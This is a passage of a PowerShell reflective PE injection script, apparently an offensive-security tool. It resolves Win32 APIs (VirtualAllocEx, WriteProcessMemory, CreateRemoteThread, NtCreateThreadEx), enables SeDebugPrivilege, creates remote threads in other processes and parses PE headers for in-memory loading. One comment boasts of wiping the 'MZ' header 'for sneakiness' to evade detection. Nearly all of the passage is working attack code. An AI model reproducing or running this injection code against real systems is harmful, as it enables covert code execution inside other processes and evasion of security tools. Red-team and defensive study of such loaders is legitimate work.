            $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
            $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
            $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
            $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
            $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
            $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
            $memsetAddr = Get-ProcAddress msvcrt.dll memset
            $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
            $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
            $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
            $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
            $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
            $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
            $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
            $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
            $GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
            $GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
            $GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
        
            $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
            $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
            $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
            $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
            $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
            $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
            $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
            $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
            $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
            $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
            $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
            $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
            $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
            $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
            $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
            $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
            $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
            $FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
            $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
            $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
            $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
            $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
            $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
            $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
            $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
            $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
            $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
            $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
            $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
            $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
            $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
            $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
            $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
            $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
            $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
            $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
            $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
            $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
            $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
            $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
            $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
            $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
            $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
            $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
            $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
            $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
            $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
            $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
            $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
            $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
            $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
            $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        
            # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
            if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6, 0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6, 2))) {
                $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
                $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
                $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
            }
        
            $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
            $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
            $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
            $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
            $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
    
            $LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
            $LocalFreeDelegate = Get-DelegateType @([IntPtr])
            $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
            $Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree

            return $Win32Functions
        }
        #####################################

            
        #####################################
        ###########    HELPERS   ############
        #####################################

        #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
        #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
        Function Sub-SignedIntAsUnsigned {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Int64]
                $Value1,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $Value2
            )
        
            [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
            [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
            [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

            if ($Value1Bytes.Count -eq $Value2Bytes.Count) {
                $CarryOver = 0
                for ($i = 0; $i -lt $Value1Bytes.Count; $i++) {
                    $Val = $Value1Bytes[$i] - $CarryOver
                    #Sub bytes
                    if ($Val -lt $Value2Bytes[$i]) {
                        $Val += 256
                        $CarryOver = 1
                    }
                    else {
                        $CarryOver = 0
                    }
                
                
                    [UInt16]$Sum = $Val - $Value2Bytes[$i]

                    $FinalBytes[$i] = $Sum -band 0x00FF
                }
            }
            else {
                Throw 'Cannot subtract bytearrays of different sizes'
            }
        
            return [BitConverter]::ToInt64($FinalBytes, 0)
        }
    

        Function Add-SignedIntAsUnsigned {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Int64]
                $Value1,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $Value2
            )
        
            [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
            [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
            [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

            if ($Value1Bytes.Count -eq $Value2Bytes.Count) {
                $CarryOver = 0
                for ($i = 0; $i -lt $Value1Bytes.Count; $i++) {
                    #Add bytes
                    [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                    $FinalBytes[$i] = $Sum -band 0x00FF
                
                    if (($Sum -band 0xFF00) -eq 0x100) {
                        $CarryOver = 1
                    }
                    else {
                        $CarryOver = 0
                    }
                }
            }
            else {
                Throw 'Cannot add bytearrays of different sizes'
            }
        
            return [BitConverter]::ToInt64($FinalBytes, 0)
        }
    

        Function Compare-Val1GreaterThanVal2AsUInt {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Int64]
                $Value1,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $Value2
            )
        
            [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
            [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

            if ($Value1Bytes.Count -eq $Value2Bytes.Count) {
                for ($i = $Value1Bytes.Count - 1; $i -ge 0; $i--) {
                    if ($Value1Bytes[$i] -gt $Value2Bytes[$i]) {
                        return $true
                    }
                    elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i]) {
                        return $false
                    }
                }
            }
            else {
                Throw 'Cannot compare byte arrays of different size'
            }
        
            return $false
        }
    

        Function Convert-UIntToInt {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [UInt64]
                $Value
            )
        
            [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
            return ([BitConverter]::ToInt64($ValueBytes, 0))
        }
    
    
        Function Test-MemoryRangeValid {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [String]
                $DebugString,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $PEInfo,
        
                [Parameter(Position = 2, Mandatory = $true)]
                [IntPtr]
                $StartAddress,
        
                [Parameter(ParameterSetName = 'Size', Position = 3, Mandatory = $true)]
                [IntPtr]
                $Size
            )
        
            [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
        
            $PEEndAddress = $PEInfo.EndAddress
        
            if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true) {
                Throw "Trying to write to memory smaller than allocated address range. $DebugString"
            }
            if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true) {
                Throw "Trying to write to memory greater than allocated address range. $DebugString"
            }
        }
    
    
        Function Write-BytesToMemory {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Byte[]]
                $Bytes,
            
                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $MemoryAddress
            )
    
            for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++) {
                [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
            }
        }
    

        #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
        Function Get-DelegateType {
            Param
            (
                [OutputType([Type])]
            
                [Parameter( Position = 0)]
                [Type[]]
                $Parameters = (New-Object Type[](0)),
            
                [Parameter( Position = 1 )]
                [Type]
                $ReturnType = [Void]
            )

            $Domain = [AppDomain]::CurrentDomain
            $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
            $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
            $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
            $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
            $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
            $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
            Write-Output $TypeBuilder.CreateType()
        }


        #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
        Function Get-ProcAddress {
            Param
            (
                [OutputType([IntPtr])]
        
                [Parameter( Position = 0, Mandatory = $True )]
                [String]
                $Module,
            
                [Parameter( Position = 1, Mandatory = $True )]
                [String]
                $Procedure
            )

            # Get a reference to System.dll in the GAC
            $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
                Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
            $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
            # Get a reference to the GetModuleHandle and GetProcAddress methods
            $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
            $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
            # Get a handle to the module specified
            $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
            $tmpPtr = New-Object IntPtr
            $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

            # Return the address of the function
            Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
        }
    
    
        Function Enable-SeDebugPrivilege {
            Param(
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $Win32Functions,
        
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $Win32Types,
        
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $Win32Constants
            )
        
            [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
            if ($ThreadHandle -eq [IntPtr]::Zero) {
                Throw 'Unable to get the handle to the current thread'
            }
        
            [IntPtr]$ThreadToken = [IntPtr]::Zero
            [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
            if ($Result -eq $false) {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN) {
                    $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                    if ($Result -eq $false) {
                        Throw 'Unable to impersonate self'
                    }
                
                    $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                    if ($Result -eq $false) {
                        Throw 'Unable to OpenThreadToken.'
                    }
                }
                else {
                    Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
                }
            }
        
            [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
            $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, 'SeDebugPrivilege', $PLuid)
            if ($Result -eq $false) {
                Throw 'Unable to call LookupPrivilegeValue'
            }

            [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
            [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
            $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
            $TokenPrivileges.PrivilegeCount = 1
            $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
            $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

            $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
            if (($Result -eq $false) -or ($ErrorCode -ne 0)) {
                #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
            }
        
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
        }
    
    
        Function Invoke-CreateRemoteThread {
            Param(
                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $ProcessHandle,
        
                [Parameter(Position = 2, Mandatory = $true)]
                [IntPtr]
                $StartAddress,
        
                [Parameter(Position = 3, Mandatory = $false)]
                [IntPtr]
                $ArgumentPtr = [IntPtr]::Zero,
        
                [Parameter(Position = 4, Mandatory = $true)]
                [System.Object]
                $Win32Functions
            )
        
            [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
            $OSVersion = [Environment]::OSVersion.Version
            #Vista and Win7
            if (($OSVersion -ge (New-Object 'Version' 6, 0)) -and ($OSVersion -lt (New-Object 'Version' 6, 2))) {
                Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
                $RetVal = $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
                $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if ($RemoteThreadHandle -eq [IntPtr]::Zero) {
                    Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
                }
            }
            #XP/Win8
            else {
                Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
                $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
            }
        
            if ($RemoteThreadHandle -eq [IntPtr]::Zero) {
                Write-Verbose 'Error creating remote thread, thread handle is null'
            }
        
            return $RemoteThreadHandle
        }

    

        Function Get-ImageNtHeaders {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $PEHandle,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $Win32Types
            )
        
            $NtHeadersInfo = New-Object System.Object
        
            #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
            $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

            #Get IMAGE_NT_HEADERS
            [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
            $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
        
            #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
            if ($imageNtHeaders64.Signature -ne 0x00004550) {
                throw 'Invalid IMAGE_NT_HEADER signature.'
            }
        
            if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC') {
                $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
                $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
            }
            else {
                $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
                $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
                $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
            }
        
            return $NtHeadersInfo
        }


        #This function will get the information needed to allocated space in memory for the PE
        Function Get-PEBasicInfo {
            Param(
                [Parameter( Position = 0, Mandatory = $true )]
                [Byte[]]
                $PEBytes,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $Win32Types
            )
        
            $PEInfo = New-Object System.Object
        
            #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
            [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
            [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
        
            #Get NtHeadersInfo
            $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
        
            #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
            $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
            $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
            $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
            $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
            $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
            #Free the memory allocated above, this isn't where we allocate the PE to memory
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
        
            return $PEInfo
        }


        #PEInfo must contain the following NoteProperties:
        #   PEHandle: An IntPtr to the address the PE is loaded to in memory
        Function Get-PEDetailedInfo {
            Param(
                [Parameter( Position = 0, Mandatory = $true)]
                [IntPtr]
                $PEHandle,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $Win32Types,
        
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $Win32Constants
            )
        
            if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero) {
                throw 'PEHandle is null or IntPtr.Zero'
            }
        
            $PEInfo = New-Object System.Object
        
            #Get NtHeaders information
            $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
        
            #Build the PEInfo object
            $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
            $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
            $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
            $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
            $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
            if ($PEInfo.PE64Bit -eq $true) {
                [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
                $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
            }
            else {
                [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
                $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
            }
        
            if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL) {
                $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
            }
